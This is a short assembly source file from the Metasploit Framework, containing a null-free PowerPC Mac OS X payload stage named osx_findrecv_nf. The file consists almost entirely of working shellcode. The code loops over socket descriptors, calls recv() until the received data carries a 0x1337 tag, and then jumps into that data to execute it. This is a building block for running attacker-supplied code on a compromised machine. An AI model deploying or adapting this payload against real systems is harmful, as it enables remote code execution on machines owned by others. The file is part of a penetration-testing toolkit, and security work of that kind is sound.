;;
;
;        Name: osx_findrecv_nf
;   Qualities: Null-Free
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision$
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload will recv() downward until the read
;        data contains the search tag (0xXXXX1337). Once the
;        tag is located, it will jump into the payload.
;
;;

.globl _main
.text
_main:
	li 	r29, 0xfff
	mtctr 	r29

findsock:
	subi	r0, r29, 0xfff - 102
	mfctr	r3
	subi	r4, r1, 4104
	li 	r5, 4095
	xor.	r6, r6, r6
	.long   0x44ffff02
	xor.	r6, r6, r6
	mfctr	r30
	lhz	r28, -4104(r1)
	cmpwi	r28, 0x1337
	bdnzf	eq, findsock	

gotsock:
	subi	r4, r1, 4100
	mtctr	r4
	blectr	
	xor.	r6, r6, r6
